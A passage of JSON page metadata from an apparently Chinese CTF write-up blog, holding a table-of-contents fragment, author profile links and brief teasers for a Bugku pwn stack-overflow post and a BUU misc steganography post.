href=\"#%E6%80%9D%E8%B7%AF-4\"><span class=\"toc-text\">思路</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%88%86%E6%9E%90\"><span class=\"toc-text\">分析</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP-5\"><span class=\"toc-text\">EXP</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#NO-RELRO\"><span class=\"toc-text\">NO RELRO</span></a></li></ol>","author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"不要等待，时机永远不会恰到好处。","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"Bugku pwn","uid":"144f81ea5594fe5e9363a228d67919cf","slug":"Bugku-PWN","date":"2021-07-03T14:10:52.000Z","updated":"2021-10-16T10:01:08.005Z","comments":true,"path":"api/articles/Bugku-PWN.json","keywords":null,"cover":"https://i.loli.net/2021/07/04/Ow9MJU1YyhFeIjC.jpg","text":"overflowcheck一下可以看到是64位程序，什么保护也没开，IDA查看，可以看到存在明显的栈溢出 再看函数窗口，可以看见存在一个可疑的函数，点进去可以发现是一个后门函数 所以思路就是利用栈溢出跳转到后门函数，这样就可以得到flag EXP12345from pwn imp...","link":"","photos":[],"count_time":{"symbolsCount":"1.7k","symbolsTime":"2 mins."},"categories":[{"name":"刷题","slug":"刷题","count":6,"path":"api/categories/刷题.json"}],"tags":[{"name":"pwn","slug":"pwn","count":6,"path":"api/tags/pwn.json"}],"author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"不要等待，时机永远不会恰到好处。","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}}},"next_post":{"title":"BUU misc","uid":"794e58abd4973dfacdc6d660b3849142","slug":"BUU-MISC","date":"2021-05-31T00:48:04.000Z","updated":"2021-10-17T02:25:03.708Z","comments":true,"path":"api/articles/BUU-MISC.json","keywords":null,"cover":"https://i.loli.net/2021/06/06/eXnPUrYdWb3qpIN.jpg","text":"金三胖下载附件，打开是gif，仔细看发现gif会闪现一些字符，通过利用Stegsolve或者PS逐帧分析合并就可得到flag 二维码在线扫码，得到secret is here 用winhex打开发现图片里面藏了压缩包，压缩包里面有一个4number.txt文件 利用binwalk...","link":"","photos":[],"count_time":{"symbolsCount":980,"symbolsTime":"1 mins."},"categories":[{"name":"刷题","slug":"刷题","count":6,"path":"api/categories/刷题.json"}],"tags":[{"name":"misc","slug":"misc","count":3,"path":"api/tags/misc.json"}],"author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"不要等待，时机永远不会恰到好处。","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}}}}